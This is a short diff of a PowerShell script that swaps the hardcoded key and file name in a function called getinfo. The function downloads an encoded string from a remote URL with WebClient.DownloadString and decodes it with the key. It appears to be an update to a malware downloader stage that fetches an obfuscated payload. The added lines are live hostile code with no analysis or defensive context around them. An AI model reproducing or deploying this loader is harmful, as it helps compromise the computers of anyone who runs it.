@@ -27,8 +27,8 @@ $tid = "db"
 
 function getinfo
 {
-	$Key = "0D7BKJn86dua5Y1QXVnUYJ7/YQ6lMqTRxguMX4yP9oc="
-	$endtag = "1.txt"
+	$Key = "Ub/kTF6IGErvO7LJPFu1daEeiXh+vJuDUeVMIei7UP8="
+	$endtag = "science.txt"
 	$downpsurl = $rfvwd + $endtag
 	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
 	$comletter = DecodeString -obfString $codestring -Key $Key
